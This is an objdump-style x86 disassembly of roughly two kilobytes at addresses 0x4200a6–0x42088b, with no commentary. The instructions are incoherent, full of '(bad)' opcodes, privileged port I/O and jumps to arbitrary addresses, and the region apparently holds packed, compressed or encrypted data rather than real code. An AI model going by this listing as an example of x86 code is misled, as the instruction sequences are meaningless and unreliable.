  4200a6:	lods   eax,DWORD PTR ds:[esi]
  4200a7:	inc    ebp
  4200a8:	jne    0x4200ff
  4200aa:	repnz pop edi
  4200ac:	ficom  DWORD PTR [ebp+0x72]
  4200af:	rol    DWORD PTR [edi],cl
  4200b1:	jmp    0x6a98a76f
  4200b6:	out    dx,eax
  4200b7:	je     0x42008c
  4200b9:	aam    0x2
  4200bb:	fs je  0x420079
  4200be:	jle    0x420107
  4200c0:	gs sub eax,0x50082641
  4200c6:	clc    
  4200c7:	call   0x1fae:0xc5ea4cf7
  4200ce:	ins    BYTE PTR es:[edi],dx
  4200cf:	xor    dl,BYTE PTR ds:[eax-0x21]
  4200d3:	ret    
  4200d4:	lock xchg ecx,eax
  4200d6:	pop    edi
  4200d7:	js     0x4200ab
  4200d9:	mov    bh,0x8
  4200db:	nop
  4200dc:	clc    
  4200dd:	pop    esi
  4200de:	(bad)  
  4200df:	adc    DWORD PTR [edi],edi
  4200e1:	or     dl,al
  4200e3:	jae    0x420131
  4200e5:	out    dx,eax
  4200e6:	scas   al,BYTE PTR es:[edi]
  4200e7:	or     BYTE PTR [esi-0x70],al
  4200ea:	les    edi,FWORD PTR [eax]
  4200ec:	(bad)  
  4200ed:	adc    DWORD PTR fs:[ebx-0x4d],edi
  4200f1:	int    0xc4
  4200f3:	cpuid  
  4200f5:	adc    eax,0x5000e121
  4200fa:	mov    ch,0xb2
  4200fc:	inc    ebx
  4200fd:	call   0xa53:0x695cc736
  420104:	add    eax,0x9320a3ba
  420109:	sti    
  42010a:	arpl   WORD PTR [esi-0x79],bp
  42010d:	sub    eax,DWORD PTR [edx-0x6411f459]
  420113:	sub    dh,BYTE PTR [edx]
  420115:	je     0x4200b9
  420117:	mov    ds:0xb78c15db,eax
  42011c:	das    
  42011d:	xor    DWORD PTR [ebp+0x51],0xd1cf489f
  420124:	dec    esp
  420125:	es dec ebx
  420127:	(bad)  
  420128:	shl    BYTE PTR [esi-0x35],1
  42012b:	stc    
  42012c:	retf   
  42012d:	mov    eax,0x217f6610
  420132:	(bad)  
  420133:	fisttp DWORD PTR [eax-0x9cd8c86]
  420139:	xor    eax,DWORD PTR [ebp+0x4c]
  42013c:	push   esi
  42013d:	sub    BYTE PTR [ebx-0x79],dl
  420140:	pop    edi
  420141:	mov    ebx,0x35d9399d
  420146:	in     eax,0x92
  420148:	dec    eax
  420149:	stos   BYTE PTR es:[edi],al
  42014a:	addr16 loope 0x4200cf
  42014d:	inc    edi
  42014e:	js     0x4201ac
  420150:	pop    edi
  420151:	sub    esi,ecx
  420153:	xchg   DWORD PTR [eax],edi
  420155:	xchg   edx,eax
  420156:	dec    edx
  420157:	push   ecx
  420158:	test   eax,esp
  42015a:	mov    ah,0x12
  42015c:	cld    
  42015d:	dec    edx
  42015e:	leave  
  42015f:	(bad)  
  420160:	jnp    0x420125
  420162:	push   ecx
  420163:	das    
  420164:	mov    al,0xf
  420166:	nop
  420167:	inc    ebp
  420168:	inc    edx
  420169:	inc    eax
  42016a:	add    eax,0xc29aa373
  42016f:	dec    ecx
  420170:	dec    edi
  420171:	cmp    bl,BYTE PTR [esi+0x7e]
  420174:	enter  0x7f8e,0xb3
  420178:	jge    0x4201db
  42017a:	lds    esi,FWORD PTR [eax]
  42017c:	push   ecx
  42017d:	xor    BYTE PTR [edi+esi*2+0x8a20ae],bh
  420184:	add    BYTE PTR [eax],al
  420186:	add    BYTE PTR [eax],al
  420188:	add    BYTE PTR [eax],al
  42018a:	pop    ecx
  42018b:	push   edi
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x64],esi
  420197:	rcr    eax,0xf3
  42019a:	rcl    DWORD PTR [eax+0x6810001],cl
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	jb     0x42012e
  4201a4:	call   eax
  4201a6:	and    DWORD PTR [edx+ecx*4-0x6a],edx
  4201aa:	mov    al,0xea
  4201ac:	push   0xafc0f0e2
  4201b1:	outs   dx,BYTE PTR ds:[esi]
  4201b2:	pop    gs
  4201b4:	out    dx,eax
  4201b5:	pop    ss
  4201b6:	jne    0x42015b
  4201b8:	or     eax,0xf7f712a3
  4201bd:	enter  0xd8e4,0x1a
  4201c1:	pop    ds
  4201c2:	push   0xffffffa1
  4201c4:	xchg   BYTE PTR [edi+0x51],ch
  4201c7:	pop    ss
  4201c8:	(bad)  
  4201c9:	loope  0x4201fc
  4201cb:	ss push edx
  4201cd:	repnz sub eax,0x8678ac25
  4201d3:	pop    eax
  4201d4:	clc    
  4201d5:	stos   DWORD PTR es:[edi],eax
  4201d6:	shl    DWORD PTR ds:0x7e37f908,cl
  4201dc:	push   es
  4201dd:	jbe    0x420232
  4201df:	adc    BYTE PTR [edi],bl
  4201e1:	or     al,0x6c
  4201e3:	sbb    BYTE PTR [edi-0x80],cl
  4201e6:	test   eax,0xb1cf96f8
  4201eb:	fsincos 
  4201ed:	pushf  
  4201ee:	mov    bl,0xc7
  4201f0:	cmp    eax,0x534038bc
  4201f5:	jne    0x4201c0
  4201f7:	jmp    0x420205
  4201f9:	dec    DWORD PTR [esi+0x4f5d74f]
  4201ff:	pop    esi
  420200:	out    dx,eax
  420201:	jmp    0xecad5206
  420206:	fnsave [eax-0x5]
  420209:	xor    DWORD PTR ds:0x78694196,0x92548450
  420213:	push   DWORD PTR [ebx+edx*1]
  420216:	or     DWORD PTR [esi-0x56f1ba1e],esp
  42021c:	cmp    eax,edi
  42021e:	inc    ecx
  42021f:	pop    edx
  420220:	popf   
  420221:	mov    eax,ds:0x579279f4
  420226:	and    ah,BYTE PTR [ebx-0x28651772]
  42022c:	in     al,dx
  42022d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42022e:	jle    0x420272
  420230:	sti    
  420231:	in     eax,dx
  420232:	push   cs
  420233:	push   es
  420234:	and    al,0xf5
  420236:	adc    eax,0x37ff28dc
  42023b:	stos   DWORD PTR es:[edi],eax
  42023c:	aas    
  42023d:	and    BYTE PTR [ebp+0xe],bh
  420240:	in     al,0xbe
  420242:	(bad)  
  420243:	in     al,dx
  420244:	cmp    BYTE PTR [edx-0x7160b1b7],bl
  42024a:	xchg   esp,eax
  42024b:	pop    ebx
  42024c:	or     bh,BYTE PTR [ebx]
  42024e:	dec    ecx
  42024f:	cdq    
  420250:	inc    ebp
  420251:	jle    0x420219
  420253:	jbe    0x420288
  420255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420256:	xor    al,0x2b
  420258:	pop    ss
  420259:	mov    edx,0x6da3b805
  42025e:	xor    eax,0x44c0199e
  420263:	sbb    BYTE PTR [edi+0x5d],dh
  420266:	les    eax,FWORD PTR [ebp-0x60]
  420269:	pop    ebp
  42026a:	jmp    0x7f31:0x27af1b7
  420271:	ret    
  420272:	mov    eax,0x940d127a
  420277:	add    eax,0xea80752d
  42027c:	cmp    bh,BYTE PTR ds:0xaf60
  420281:	dec    edi
  420282:	repnz out 0x34,al
  420285:	sbb    ecx,DWORD PTR [eax+0x51]
  420288:	nop
  420289:	call   0xb2d11a35
  42028e:	lds    ecx,FWORD PTR [edx+ebp*8-0xb1a60a3]
  420295:	aas    
  420296:	adc    ch,ah
  420298:	popf   
  420299:	jno    0x420251
  42029b:	outs   dx,DWORD PTR ds:[esi]
  42029c:	data16 jb 0x420256
  42029f:	xchg   bl,dl
  4202a1:	sub    esp,DWORD PTR [esi-0x1abafd6a]
  4202a7:	mov    ch,0x7e
  4202a9:	retf   
  4202aa:	pop    ss
  4202ab:	lahf   
  4202ac:	and    al,0xc8
  4202ae:	lods   al,BYTE PTR ds:[esi]
  4202af:	out    0xb9,al
  4202b1:	adc    eax,DWORD PTR [edi+0x50ae37e0]
  4202b7:	adc    BYTE PTR ds:0xc69c5616,al
  4202bd:	aam    0x35
  4202bf:	test   DWORD PTR [eax+eiz*4+0xd9ffbaa],0xf732f310
  4202ca:	mov    dh,0xfc
  4202cc:	push   es
  4202cd:	fdiv   st(2),st
  4202cf:	mov    ah,0xc6
  4202d1:	and    eax,0x936b5845
  4202d6:	repz test BYTE PTR [esi-0x69],al
  4202da:	mov    eax,0x28e5b5fc
  4202df:	adc    eax,0x2bfcff1f
  4202e4:	xor    BYTE PTR [esi],ah
  4202e6:	gs in  al,dx
  4202e8:	popa   
  4202e9:	(bad)
  4202ec:	fistp  WORD PTR [esp+eiz*8+0x7cafd098]
  4202f3:	cli    
  4202f4:	outs   dx,DWORD PTR ds:[esi]
  4202f5:	cmc    
  4202f6:	dec    esi
  4202f7:	fidivr DWORD PTR ds:0xe4c8a08
  4202fd:	arpl   WORD PTR [esi+0x76],bx
  420300:	push   ss
  420301:	mov    ch,BYTE PTR [edi-0x32]
  420304:	push   0xae614ae6
  420309:	dec    ecx
  42030a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030b:	add    al,BYTE PTR [ecx]
  42030d:	loope  0x420337
  42030f:	in     eax,0xc1
  420311:	int3   
  420312:	fistp  DWORD PTR [ecx+edi*8+0x7e]
  420316:	fist   DWORD PTR [eax]
  420318:	mov    dl,0xba
  42031a:	dec    edi
  42031b:	fsubrp st(5),st
  42031d:	ss das 
  42031f:	sar    BYTE PTR [eax],1
  420321:	mov    ebp,0x8633706f
  420326:	cmp    edx,0xae630a6
  42032c:	sub    eax,0x3dbda416
  420331:	adc    al,0x64
  420333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420334:	jmp    0x420364
  420336:	aam    0xf5
  420338:	sub    edx,DWORD PTR [eax-0x3ac86823]
  42033e:	daa    
  42033f:	pushf  
  420340:	xor    esp,edi
  420342:	pop    ss
  420343:	test   DWORD PTR [edi],esi
  420345:	ins    BYTE PTR es:[edi],dx
  420346:	jns    0x4202ce
  420348:	mov    edx,0xe95d08d1
  42034d:	dec    esp
  42034e:	stc    
  42034f:	sub    ebx,edi
  420351:	adc    DWORD PTR [ecx],0x6e655aa6
  420357:	fsubr  DWORD PTR [esi-0x54]
  42035a:	cwde   
  42035b:	mov    eax,0x6c96b0f
  420360:	loop   0x42039f
  420362:	fwait
  420363:	xchg   ebp,eax
  420364:	in     eax,dx
  420365:	data16 aas 
  420367:	push   ds
  420368:	arpl   WORD PTR [edi+eax*2-0x69],bp
  42036c:	into   
  42036d:	loopne 0x4203de
  42036f:	shr    BYTE PTR [edi+0x72a5b8c1],1
  420375:	dec    edx
  420376:	cli    
  420377:	xchg   DWORD PTR [ebx+0x66807c96],ecx
  42037d:	icebp  
  42037e:	add    edx,edi
  420380:	les    eax,FWORD PTR [ebx]
  420382:	jb     0x420352
  420384:	pop    ecx
  420385:	ss out 0x3a,al
  420388:	ds dec edi
  42038a:	mov    eax,0x701e1487
  42038f:	sub    BYTE PTR [edx+0x72],ah
  420392:	pop    ds
  420393:	imul   esi,edi,0xffffffdc
  420396:	test   eax,0x96481295
  42039b:	fdiv   DWORD PTR [edi+0x8]
  42039e:	mov    edx,0x56ba7ba8
  4203a3:	out    0x25,eax
  4203a5:	aaa    
  4203a6:	push   cs
  4203a7:	popf   
  4203a8:	xchg   BYTE PTR [edx],ch
  4203aa:	push   es
  4203ab:	mov    ecx,0xe2df8d6e
  4203b0:	cmp    ebx,ebp
  4203b2:	cmp    BYTE PTR [edi-0x3a],0xc4
  4203b6:	fbld   TBYTE PTR [eax+0x178e65a6]
  4203bc:	mov    eax,0x2ae75a7d
  4203c1:	jae    0x4203d6
  4203c3:	dec    esi
  4203c4:	ret    0x53a3
  4203c7:	das    
  4203c8:	xor    al,0xfd
  4203ca:	mov    ah,cl
  4203cc:	aaa    
  4203cd:	call   FWORD PTR [eax]
  4203cf:	cmp    BYTE PTR [edi-0x62c3742],dl
  4203d5:	dec    esp
  4203d6:	add    eax,0xdde77bbd
  4203db:	mov    esp,0x6757dcd3
  4203e0:	xchg   ebp,eax
  4203e1:	dec    ebp
  4203e2:	icebp  
  4203e3:	bound  ebx,QWORD PTR [ecx]
  4203e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203e6:	sub    DWORD PTR [esi+eiz*2-0x47],ebp
  4203ea:	cmp    eax,0x3430692c
  4203ef:	sub    DWORD PTR [esp+edi*2],esi
  4203f2:	nop
  4203f3:	xlat   BYTE PTR ds:[ebx]
  4203f4:	std    
  4203f5:	les    edx,FWORD PTR [eax+0x57]
  4203f8:	(bad)  
  4203f9:	cmp    ah,BYTE PTR [ebp+0x4d910123]
  4203ff:	retf   0x392c
  420402:	mov    ebp,DWORD PTR [esi]
  420404:	sub    cl,al
  420406:	cwde   
  420407:	add    bh,BYTE PTR [eax-0x7fc00603]
  42040d:	dec    ebx
  42040f:	mov    dh,BYTE PTR [edx]
  420411:	xlat   BYTE PTR ds:[ebx]
  420412:	adc    eax,0xf9c6a9aa
  420417:	retf   0xc453
  42041a:	ret    0xf46e
  42041d:	pop    eax
  42041e:	lea    ebp,[ebp-0x6bd5c06]
  420424:	inc    eax
  420425:	mov    BYTE PTR [edx],bh
  420427:	out    dx,eax
  420428:	cwde   
  420429:	neg    DWORD PTR [edi-0x47]
  42042c:	and    eax,esi
  42042e:	mov    BYTE PTR [eax],bh
  420430:	(bad)  
  420431:	data16 adc dl,BYTE PTR [edi]
  420434:	dec    esi
  420435:	aas    
  420436:	mov    al,0x9d
  420438:	dec    ebx
  420439:	xor    eax,0x9467b7a8
  42043e:	inc    esi
  42043f:	sbb    al,0x4e
  420441:	push   cs
  420442:	mov    bh,0x21
  420444:	test   BYTE PTR [eax+0x16],ch
  420447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420448:	es (bad) 
  42044b:	sti    
  42044c:	fmul   DWORD PTR [esi]
  42044e:	add    ah,BYTE PTR [ecx]
  420450:	xchg   DWORD PTR [esi+esi*2],ebx
  420453:	adc    ebx,edi
  420455:	push   es
  420456:	push   edi
  420457:	je     0x4204af
  420459:	or     ecx,DWORD PTR [ecx]
  42045b:	or     DWORD PTR ds:0xcb019136,0xffffff88
  420462:	daa    
  420463:	dec    esi
  420464:	mov    edx,0x94c9b60f
  420469:	mov    esi,DWORD PTR [ebx+0x2e]
  42046c:	push   edi
  42046d:	adc    BYTE PTR [edx],bh
  42046f:	loop   0x4204ee
  420471:	mov    ecx,0x47807295
  420476:	sub    al,0x5f
  420478:	mov    esi,0x2aced7b4
  42047d:	xchg   edi,eax
  42047e:	enter  0xca6e,0xbd
  420482:	sub    ch,al
  420484:	ret    
  420485:	scas   eax,DWORD PTR es:[edi]
  420486:	stos   DWORD PTR es:[edi],eax
  420487:	xchg   esp,eax
  420488:	jge    0x4204cd
  42048a:	bound  edx,QWORD PTR ds:[eax+0x4a]
  42048e:	mov    ah,0xa9
  420490:	sbb    dh,0xae
  420493:	scas   al,BYTE PTR es:[edi]
  420494:	mov    ebx,0x37467c7d
  420499:	mov    ebx,0xb6fb65
  42049e:	jno    0x4204ce
  4204a0:	(bad)  
  4204a1:	scas   eax,DWORD PTR es:[edi]
  4204a2:	or     al,0xae
  4204a4:	push   esp
  4204a5:	leave  
  4204a6:	pop    edi
  4204a7:	or     ebx,DWORD PTR [ecx]
  4204a9:	jbe    0x420519
  4204ab:	lods   al,BYTE PTR ds:[esi]
  4204ac:	and    al,0xbe
  4204ae:	(bad)  
  4204af:	pusha  
  4204b0:	cwde   
  4204b1:	sti    
  4204b2:	imul   edx,DWORD PTR [edx],0xd1a12d21
  4204b8:	ret    
  4204b9:	neg    BYTE PTR [eax-0x56cb6448]
  4204bf:	inc    eax
  4204c0:	inc    DWORD PTR [edx+0x4ca2322f]
  4204c6:	ss sti 
  4204c8:	xor    ch,dl
  4204ca:	lahf   
  4204cb:	jg     0x4204d6
  4204cd:	mov    bh,0x1f
  4204cf:	gs sub ch,dl
  4204d2:	or     eax,0x7456154
  4204d7:	outs   dx,BYTE PTR ds:[esi]
  4204d8:	xchg   esi,eax
  4204d9:	fidiv  DWORD PTR [ebp+0xf8a82d3]
  4204df:	jne    0x4204f7
  4204e1:	mov    bl,BYTE PTR [edi+eax*8+0x76]
  4204e5:	bound  edx,QWORD PTR [ebp+0x261ea81d]
  4204eb:	ss cwde 
  4204ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204ee:	mov    cl,0x14
  4204f0:	cmp    al,0xe
  4204f2:	pop    esp
  4204f3:	dec    esp
  4204f4:	fistp  QWORD PTR [edi-0x3b]
  4204f7:	mov    esp,0x8b3fed97
  4204fc:	ror    al,cl
  4204fe:	cmp    bh,cl
  420500:	xchg   esp,eax
  420501:	sbb    ch,BYTE PTR [edx+0x733373cd]
  420507:	sub    eax,DWORD PTR [ebp-0x1b]
  42050a:	jecxz  0x4204f9
  42050c:	imul   esi,esp,0x1d
  42050f:	and    DWORD PTR [ecx-0x66b545fb],esi
  420515:	mov    al,BYTE PTR [ebx-0x1b01183f]
  42051b:	mov    esp,DWORD PTR [ebp+0x5a]
  42051e:	sbb    edi,DWORD PTR [eax+ecx*1-0x16f71bad]
  420525:	loope  0x4204e8
  420527:	xchg   edx,eax
  420528:	data16 jae 0x4204f0
  42052b:	sub    eax,0xe97a2402
  420530:	setle  bh
  420533:	sbb    BYTE PTR [edi],dl
  420535:	pop    ds
  420536:	mov    dh,0xbf
  420538:	aas    
  420539:	popa   
  42053a:	pop    ebp
  42053b:	adc    ecx,esi
  42053d:	(bad)  
  42053e:	loop   0x4204d1
  420540:	aad    0x5d
  420542:	and    DWORD PTR [esi],ebx
  420544:	pop    ecx
  420545:	scas   eax,DWORD PTR es:[edi]
  420546:	adc    DWORD PTR [ecx+0x62053b0],0x7e
  42054d:	xor    al,0x10
  42054f:	sti    
  420550:	fucompp 
  420552:	jp     0x4204f6
  420554:	push   ebp
  420555:	pop    ecx
  420556:	sbb    eax,0x746d8045
  42055b:	jle    0x420599
  42055d:	pop    esi
  42055e:	sbb    al,0xc8
  420560:	inc    ecx
  420561:	mov    cl,0x21
  420563:	call   DWORD PTR [esi]
  420565:	xlat   BYTE PTR ds:[ebx]
  420566:	pop    ss
  420567:	push   ss
  420568:	nop
  420569:	mov    esi,0xf8b86057
  42056e:	pop    edi
  42056f:	sub    cl,BYTE PTR [esi-0x252f16d7]
  420575:	cmp    al,0x3b
  420577:	xchg   ebp,eax
  420578:	mov    WORD PTR [eax+ebx*8],?
  42057b:	jmp    0x420587
  42057d:	bound  edx,QWORD PTR [esp+ebp*8+0x4e]
  420581:	push   edi
  420582:	nop
  420583:	inc    ecx
  420584:	jno    0x420597
  420586:	cmc    
  420587:	cmp    esi,esi
  420589:	jle    0x420598
  42058b:	or     eax,0x30a74a6f
  420590:	scas   eax,DWORD PTR es:[edi]
  420591:	xchg   ecx,eax
  420592:	ja     0x420562
  420594:	pusha  
  420595:	pushf  
  420596:	pop    ds
  420597:	sub    al,0x22
  420599:	xchg   ecx,eax
  42059a:	fnstenv [esi]
  42059c:	push   ecx
  42059d:	shl    ah,1
  42059f:	jne    0x420588
  4205a1:	popa   
  4205a2:	mov    ds:0xcd550009,eax
  4205a7:	fidivr DWORD PTR [edx]
  4205a9:	mov    dl,0x24
  4205ab:	(bad)  
  4205ac:	mov    BYTE PTR [ebp+0x55041eaa],al
  4205b2:	ret    0xb1fe
  4205b5:	fdiv   QWORD PTR [edi+0x7f1ef5bc]
  4205bb:	jecxz  0x420623
  4205bd:	pop    esp
  4205be:	ss sub eax,0xc759b006
  4205c4:	aad    0x48
  4205c6:	test   eax,0xa7627930
  4205cb:	in     eax,0xc5
  4205cd:	or     ecx,DWORD PTR gs:[ebx]
  4205d0:	out    dx,eax
  4205d1:	ins    DWORD PTR es:[edi],dx
  4205d2:	sar    DWORD PTR [ebp+0x6f7092ad],cl
  4205d8:	retf   0xa85c
  4205db:	inc    esi
  4205dc:	xor    eax,0xe5a112d8
  4205e1:	rcl    BYTE PTR [ebx],cl
  4205e3:	(bad)  
  4205e5:	mov    ch,0x43
  4205e7:	popf   
  4205e8:	jo     0x420664
  4205ea:	sahf   
  4205eb:	aaa    
  4205ec:	and    DWORD PTR [edi+ecx*2-0x52e307c2],esp
  4205f3:	adc    al,0x83
  4205f5:	xchg   ecx,eax
  4205f6:	push   edi
  4205f7:	or     dl,bh
  4205f9:	dec    ebp
  4205fa:	lock lds edx,FWORD PTR [ecx+0x2d42fc68]
  420601:	out    dx,al
  420602:	add    BYTE PTR [edx+0xf],bh
  420605:	imul   BYTE PTR [eax]
  420607:	enter  0xf851,0x54
  42060b:	es (bad) 
  42060d:	pop    ds
  42060e:	cmp    eax,0x36caba07
  420613:	out    0x8b,eax
  420615:	cmc    
  420616:	push   eax
  420617:	jae    0x42064f
  420619:	inc    edi
  42061a:	(bad)  
  42061b:	jnp    0x420632
  42061d:	pop    esi
  42061e:	pop    ds
  42061f:	ss mov dl,0x54
  420622:	jp     0x4205e6
  420624:	jne    0x42063a
  420626:	push   esp
  420627:	js     0x4205cd
  420629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42062a:	scas   eax,DWORD PTR es:[edi]
  42062b:	or     edx,DWORD PTR [esi]
  42062d:	add    BYTE PTR [edi+0x74c0bce3],bh
  420633:	inc    edi
  420634:	pop    ecx
  420635:	mov    ecx,DWORD PTR ds:0x9ae5432c
  42063b:	mov    dl,0x57
  42063d:	jo     0x4205ea
  42063f:	fild   DWORD PTR [ebp+ebp*4+0x7ffb2787]
  420646:	dec    ecx
  420647:	out    dx,eax
  420648:	mov    esi,0x86750c7c
  42064d:	clc    
  42064e:	ins    BYTE PTR es:[edi],dx
  42064f:	gs mov bl,0xce
  420652:	mov    ds:0x6c384cf2,al
  420657:	bnd jno 0x4206b3
  42065a:	mov    bh,0x65
  42065c:	sub    al,BYTE PTR [ebx+0x51]
  42065f:	xor    esi,esp
  420661:	push   ebx
  420662:	or     BYTE PTR fs:[eax-0x656750a],bh
  420669:	cmp    DWORD PTR [esi-0xa176f1f],edx
  42066f:	cwde   
  420670:	int3   
  420671:	sti    
  420672:	ret    
  420673:	add    BYTE PTR [ebx+0x140c2568],ch
  420679:	cli    
  42067a:	repnz loop 0x4206c4
  42067d:	jnp    0x420683
  42067f:	mov    dl,0xa7
  420681:	je     0x4206ce
  420683:	rol    DWORD PTR [esi-0x5],cl
  420686:	sub    DWORD PTR [edx+ebx*8],ecx
  420689:	xor    al,0xf
  42068b:	cs dec edx
  42068d:	adc    ch,al
  42068f:	mov    ebp,0x89e8e388
  420694:	(bad)  
  420695:	xchg   esi,eax
  420696:	loop   0x42067a
  420698:	icebp  
  420699:	int3   
  42069a:	or     eax,DWORD PTR [ecx]
  42069c:	push   cs
  42069d:	mov    ds:0xf8b0a01f,eax
  4206a2:	mov    ch,0x87
  4206a4:	loop   0x420647
  4206a6:	in     eax,dx
  4206a7:	sub    al,0x4c
  4206a9:	hlt    
  4206aa:	sub    DWORD PTR [esi],ebx
  4206ac:	pop    ecx
  4206ad:	pop    ecx
  4206ae:	pop    ebx
  4206af:	retf   
  4206b0:	aam    0x7f
  4206b2:	ja     0x420705
  4206b4:	aam    0x17
  4206b6:	pop    ds
  4206b7:	ss js  0x4206cd
  4206ba:	addr16 mov al,0xed
  4206bd:	hlt    
  4206be:	sub    dh,0x63
  4206c1:	lock jecxz 0x420685
  4206c4:	test   eax,0x649918d4
  4206ca:	dec    eax
  4206cb:	arpl   WORD PTR [esi-0x2030f4ec],bp
  4206d1:	xchg   ebx,eax
  4206d2:	push   esp
  4206d3:	(bad)  
  4206d4:	mov    esp,0xc1c54c1c
  4206d9:	dec    eax
  4206da:	retf   
  4206db:	sbb    DWORD PTR [ecx],esp
  4206dd:	sti    
  4206de:	mov    ds:0xb6e3f093,al
  4206e3:	mov    DWORD PTR [esi],ebp
  4206e5:	jmp    0x4cfbaf9d
  4206ea:	push   edx
  4206eb:	test   BYTE PTR [ebx-0x42],0xa3
  4206ef:	mov    eax,0x4d6fb0da
  4206f4:	mov    edi,edi
  4206f6:	jge    0x4206cb
  4206f8:	fs mov ebp,0xc3485fdd
  4206fe:	pop    ds
  4206ff:	mov    esp,0x3f78fee
  420704:	dec    edx
  420705:	push   ebx
  420706:	enter  0x9327,0xcf
  42070a:	ret    
  42070b:	pop    ds
  42070c:	push   0x29
  42070e:	fcmovnb st,st(4)
  420710:	ds xchg edx,eax
  420712:	fs cmp eax,0x5437130a
  420718:	adc    ebx,DWORD PTR [ebx]
  42071a:	test   eax,0x38062a88
  42071f:	mov    edx,0x20f3304e
  420724:	out    0xf6,eax
  420726:	mov    edx,0x61d8a00a
  42072b:	mov    bl,0x57
  42072d:	sti    
  42072e:	or     eax,0xd813f205
  420733:	fisub  DWORD PTR [edi-0x5db0113c]
  420739:	in     eax,dx
  42073a:	jb     0x4206e6
  42073c:	sbb    al,0x13
  42073e:	imul   esp,DWORD PTR [eax],0x191b0def
  420744:	mov    DWORD PTR [esi-0x5e],eax
  420747:	and    al,BYTE PTR [ecx+0x3a85f587]
  42074d:	xchg   DWORD PTR [esi-0x60],edx
  420750:	pop    esi
  420751:	fstp   TBYTE PTR [ebx]
  420753:	fadd   st,st(3)
  420755:	aad    0x35
  420757:	sbb    esi,DWORD PTR [edi-0xf]
  42075a:	je     0x42073c
  42075c:	sub    DWORD PTR [ecx+0x3a],esp
  42075f:	inc    esp
  420760:	sahf   
  420761:	cmp    BYTE PTR [ecx-0x5b8015f1],cl
  420767:	lahf   
  420768:	mov    eax,0x3ba442bc
  42076d:	mov    dh,0x9c
  42076f:	(bad)  
  420770:	jge    0x420792
  420772:	add    al,0x6e
  420774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420776:	(bad)  
  420777:	sti    
  420778:	mov    esp,DWORD PTR [esi]
  42077a:	jae    0x4207f8
  42077c:	jae    0x420710
  42077e:	push   0x42
  420780:	imul   edi,DWORD PTR [eax+0x152dbdea],0x1daf37cf
  42078a:	lea    edi,[edx]
  42078c:	ficomp DWORD PTR [esp+ecx*2]
  42078f:	(bad)  
  420790:	js     0x420732
  420792:	adc    ch,BYTE PTR [ecx-0x5ae111ff]
  420798:	pop    ecx
  420799:	and    eax,0x190ec470
  42079e:	aaa    
  42079f:	outs   dx,BYTE PTR ds:[esi]
  4207a0:	dec    edi
  4207a1:	xchg   ebp,eax
  4207a2:	add    DWORD PTR [ebx-0x5c3c28dc],edi
  4207a8:	call   0x747ba84a
  4207ad:	cmp    al,0x33
  4207af:	xchg   ebp,eax
  4207b0:	icebp  
  4207b1:	or     bh,0xf8
  4207b4:	mov    edi,0x62e87ad9
  4207b9:	jb     0x4207c3
  4207bb:	add    eax,0xa12ea972
  4207c0:	pushf  
  4207c1:	sbb    BYTE PTR [edi-0x59],0x72
  4207c5:	retf   
  4207c6:	xchg   ebx,eax
  4207c7:	xor    DWORD PTR [ebp-0x52],esi
  4207ca:	ret    
  4207cb:	xchg   ecx,eax
  4207cc:	jge    0x420818
  4207ce:	jns    0x420842
  4207d0:	mov    dh,dh
  4207d2:	cld    
  4207d3:	retf   
  4207d4:	dec    edx
  4207d5:	icebp  
  4207d6:	aam    0xb4
  4207d8:	mov    eax,ds:0x2b70295
  4207dd:	daa    
  4207de:	sahf   
  4207df:	std    
  4207e0:	stos   BYTE PTR es:[edi],al
  4207e1:	fsubr  st(6),st
  4207e3:	imul   ebp,DWORD PTR [ecx-0x1cce124],0xca945bcd
  4207ed:	and    DWORD PTR [eax],ecx
  4207ef:	dec    eax
  4207f0:	out    dx,eax
  4207f1:	mov    ah,0x1d
  4207f3:	ins    DWORD PTR es:[edi],dx
  4207f4:	iret   
  4207f5:	xchg   ebx,eax
  4207f6:	inc    ebx
  4207f7:	ins    DWORD PTR es:[edi],dx
  4207f8:	call   0xcf343944
  4207fd:	mov    eax,0x2534e2cc
  420802:	out    dx,eax
  420803:	dec    DWORD PTR [ebx-0x4f]
  420806:	mov    edx,0x2a911198
  42080b:	xor    al,0xa8
  42080d:	pushf  
  42080e:	std    
  42080f:	call   0x9b62f42e
  420814:	mov    ecx,0x97011af
  420819:	inc    esi
  42081a:	jmp    0xe3dbb7b
  42081f:	push   eax
  420820:	test   eax,0xca47
  420825:	add    BYTE PTR [eax],al
  420827:	add    BYTE PTR [eax],al
  420829:	add    BYTE PTR [ebp+ecx*2+0x4a],al
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0x104921e
  420837:	and    eax,0x9754117a
  42083c:	add    DWORD PTR [eax],eax
  42083e:	add    DWORD PTR [esi],0xafe10000
  420844:	in     al,dx
  420845:	fldcw  WORD PTR [edi]
  420847:	add    edx,DWORD PTR [edx-0x12]
  42084a:	sbb    ebx,DWORD PTR [ebx+0x3b]
  42084d:	mov    BYTE PTR [edi+0x25995bd0],bl
  420853:	loop   0x4207e8
  420855:	fwait
  420856:	or     bh,0x5d
  420859:	cmp    ecx,DWORD PTR [ecx+0x7f79ac6c]
  42085f:	pop    esp
  420860:	dec    esi
  420861:	ins    DWORD PTR es:[edi],dx
  420862:	or     DWORD PTR [esi],esi
  420864:	ror    esp,cl
  420866:	xchg   ebx,eax
  420867:	pop    esp
  420869:	jp     0x420841
  42086b:	xchg   ebp,eax
  42086c:	cmp    eax,0x35fce434
  420871:	ins    DWORD PTR es:[edi],dx
  420872:	jmp    FWORD PTR [edx+0x1f592bf3]
  420878:	call   0x29e7:0xe503fce4
  42087f:	mov    al,0x40
  420881:	mov    ds:0xeb6c89da,al
  420886:	pop    ebx
  420887:	mov    dl,0x32
  420889:	in     al,0x68
  42088b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
